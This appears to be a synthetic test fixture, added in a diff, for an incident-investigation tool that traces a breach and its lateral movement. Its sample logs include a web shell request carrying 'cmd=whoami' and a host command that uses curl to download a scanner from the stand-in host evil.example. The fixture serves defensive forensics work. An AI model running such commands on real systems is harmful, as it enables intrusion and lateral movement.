@@ -1,0 +1,116 @@
+{
+  "investigation_intent": "报警时间 2026-06-21 10:00，黑客 IP 203.0.113.10，查第一个攻破点和横向范围",
+  "scenarios": ["S1", "S3"],
+  "params": {
+    "attacker_ip": "203.0.113.10",
+    "alert_time": "2026-06-21T10:00:00+08:00",
+    "time_start": "2026-06-21T08:00:00+08:00",
+    "time_end": "2026-06-21T20:00:00+08:00",
+    "host_ips": {
+      "web-01": "10.0.1.5",
+      "db-01": "10.0.2.10",
+      "app-02": "10.0.2.20"
+    }
+  },
+  "completeness_precheck": {
+    "overall_verdict": "full_traceable",
+    "confidence": 0.88,
+    "next_skill_blocked": false,
+    "data_gaps": []
+  },
+  "evidence_bundles": {
+    "waf_alert": [
+      {
+        "evidence_id": "waf-001",
+        "src_ip": "203.0.113.10",
+        "timestamp": "2026-06-21T09:10:05+08:00",
+        "url": "/upload/shell.php",
+        "payload": "cmd=whoami",
+        "action": "logged",
+        "host": "web-01"
+      }
+    ],
+    "host_exec": [
+      {
+        "evidence_id": "exec-001",
+        "event_type": "exec",
+        "host": "web-01",
+        "timestamp": "2026-06-21T09:15:22+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "command": ["curl", "-o", "/tmp/sshscan", "http://evil.example/sshscan"],
+        "cwd": "/var/www/html"
+      },
+      {
+        "evidence_id": "exec-002",
+        "event_type": "exec",
+        "host": "web-01",
+        "timestamp": "2026-06-21T09:18:40+08:00",
+        "listener_port": 443,
+        "listener_process": "nginx",
+        "command": ["chmod", "+x", "/tmp/sshscan"],
+        "cwd": "/tmp"
+      }
+    ],
+    "host_connect": [
+      {
+        "evidence_id": "connect-001",
+        "event_type": "active_connect",
+        "host": "web-01",
+        "timestamp": "2026-06-21T09:15:20+08:00",
+        "dst_ip": "198.51.100.5",
+        "dst_port": 80
+      }
+    ],
+    "host_file_op": [
+      {
+        "evidence_id": "file-001",
+        "event_type": "file_op",
+        "host": "web-01",
+        "timestamp": "2026-06-21T09:15:25+08:00",
+        "path": "/tmp/sshscan",
+        "action": "create"
+      }
+    ],
+    "ssh_auth": [
+      {
+        "evidence_id": "ssh-001",
+        "host": "db-01",
+        "timestamp": "2026-06-21T09:22:01+08:00",
+        "src_ip": "10.0.1.5",
+        "user": "root",
+        "result": "Accepted"
+      },
+      {
+        "evidence_id": "ssh-002",
+        "host": "app-02",
+        "timestamp": "2026-06-21T09:25:18+08:00",
+        "src_ip": "10.0.1.5",
+        "user": "deploy",
+        "result": "Accepted"
+      },
+      {
+        "evidence_id": "ssh-003",
+        "host": "db-01",
+        "timestamp": "2026-06-21T09:20:55+08:00",
+        "src_ip": "10.0.1.5",
+        "user": "root",
+        "result": "Failed"
+      }
+    ],
+    "firewall_log": [
+      {
+        "evidence_id": "fw-001",
+        "src_ip": "10.0.1.5",
+        "dst_ip": "10.0.2.10",
+        "dst_port": 22,
+        "timestamp": "2026-06-21T09:21:58+08:00"
+      }
+    ],
+    "asset_inventory": [
+      {"hostname": "web-01", "ip": "10.0.1.5", "zone": "dmz"},
+      {"hostname": "db-01", "ip": "10.0.2.10", "zone": "internal"},
+      {"hostname": "app-02", "ip": "10.0.2.20", "zone": "internal"}
+    ]
+  }
+}
